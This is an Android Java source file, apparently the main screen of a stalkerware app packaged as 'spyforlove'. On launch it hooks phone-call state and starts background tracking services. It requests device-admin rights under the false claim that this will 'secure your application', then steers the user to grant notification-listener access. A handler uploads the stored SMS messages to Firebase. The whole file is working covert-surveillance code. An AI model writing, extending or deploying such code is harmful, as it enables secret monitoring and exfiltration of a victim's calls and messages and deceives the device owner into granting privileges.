package chem.kth.spyforlove;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import chem.kth.spyforlove.broadcast.CallReceiver;
import chem.kth.spyforlove.database.DatabaseHelper;
import chem.kth.spyforlove.database.FirebaseDatabaseHelper;
import chem.kth.spyforlove.device.DeviceAdministrationReceiver;
import chem.kth.spyforlove.services.InternetChecker;
import chem.kth.spyforlove.services.TrackMainService;
import chem.kth.spyforlove.utils.AppUtils;
import chem.kth.spyforlove.utils.ServiceTools;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE = 101;
    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;
    public static final String TAG = MainActivity.class.getName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        CallReceiver callReceiver = new CallReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.PHONE_STATE");
        this.registerReceiver(callReceiver, intentFilter);

        if (!ServiceTools.isServiceRunning(InternetChecker.class.getName())) {
            Intent internetIntent = new Intent(this, InternetChecker.class);
            this.startService(internetIntent);
        }

        if (!ServiceTools.isServiceRunning(TrackMainService.class.getName())) {
            Intent intent = new Intent(this, TrackMainService.class);
            this.startService(intent);
        }

        AppUtils.permissionRequestSend();

        try {
            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            mAdminName = new ComponentName(this, DeviceAdministrationReceiver.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                startActivityForResult(adminIntent, REQUEST_CODE);
            } else {
                // mDPM.lockNow();
                // Intent intent = new Intent(MainActivity.this,
                // TrackDeviceService.class);
                // startService(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void internetOn(View view) {
        FirebaseDatabaseHelper.getInstance().uploadAllMessage();
        Log.d(TAG, "db : " + DatabaseHelper.getInstance().readSMS(true).toString());
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE && resultCode == RESULT_OK) {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
        }
    }
}